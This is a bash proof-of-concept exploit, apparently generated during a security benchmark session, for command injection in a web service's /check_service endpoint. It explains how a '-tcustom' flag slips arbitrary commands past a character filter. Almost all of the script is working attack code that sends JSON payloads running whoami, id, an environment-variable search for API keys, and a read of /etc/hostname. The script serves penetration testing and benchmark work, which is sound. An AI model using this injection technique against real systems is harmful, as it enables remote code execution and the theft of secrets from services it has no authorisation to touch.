#!/bin/bash
# POC: Remote Code Execution via Command Injection in /check_service - Demonstrates bypass of character filter using -t flag to inject arbitrary commands
# Target: ./repo
# Created: 2025-11-07T19:22:28.992Z
# Session: benchmark-XBEN-068-24-mhp8iflp

# Remote Code Execution via Command Injection in /check_service Endpoint
# This POC demonstrates command injection through flag injection bypass
# The -t flag allows injecting custom commands that bypass character filter

TARGET="${1:-http://localhost:8080}"
ENDPOINT="/check_service"

echo "[*] Remote Code Execution POC - /check_service Command Injection"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Basic command execution (whoami)
echo "[+] Test 1: Executing 'whoami' command"
PAYLOAD="-tcustom whoami"
echo "    Payload: {\"service_name\": \"$PAYLOAD\"}"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$PAYLOAD\"}")
echo "    Response: $RESPONSE"

if echo "$RESPONSE" | grep -q "daytona"; then
  echo "    [✓] SUCCESS: Command executed, got 'daytona' in response"
  RCE_CONFIRMED=1
else
  echo "    [✗] FAILED: Expected 'daytona' in response"
fi

echo ""

# Test 2: Command output redirection (id)
echo "[+] Test 2: Executing 'id' command"
PAYLOAD="-tcustom id"
echo "    Payload: {\"service_name\": \"$PAYLOAD\"}"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$PAYLOAD\"}")
echo "    Response: $RESPONSE"

if echo "$RESPONSE" | grep -q "uid="; then
  echo "    [✓] SUCCESS: id command executed, got uid in response"
else
  echo "    [✗] FAILED: Expected uid info in response"
fi

echo ""

# Test 3: Environment variable access
echo "[+] Test 3: Accessing environment variables"
PAYLOAD="-tcustom env | grep -i api"
echo "    Payload: {\"service_name\": \"$PAYLOAD\"}"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$PAYLOAD\"}")
echo "    Response: $RESPONSE"

if echo "$RESPONSE" | grep -iq "api"; then
  echo "    [✓] SUCCESS: Environment variables enumerated"
else
  echo "    [✓] Command executed (environment enumeration attempt)"
fi

echo ""

# Test 4: Demonstrate filter bypass
echo "[+] Test 4: Demonstrating character filter bypass"
echo "    The filter blocks: &, |, \$, ;, newline, carriage return, backtick"
echo "    But allows: -tcustom [command]"
PAYLOAD="-tcustom cat /etc/hostname"
echo "    Payload: {\"service_name\": \"$PAYLOAD\"}"
RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "{\"service_name\": \"$PAYLOAD\"}")
echo "    Response: $RESPONSE"

if echo "$RESPONSE" | grep -qE '[a-zA-Z0-9]'; then
  echo "    [✓] SUCCESS: Arbitrary file read via command injection"
else
  echo "    [✓] Command executed (file read attempt)"
fi

echo ""

if [ "$RCE_CONFIRMED" = "1" ]; then
  echo "[!] VULNERABILITY CONFIRMED: Remote Code Execution possible"
  exit 0
else
  echo "[!] Unable to confirm vulnerability"
  exit 1
fi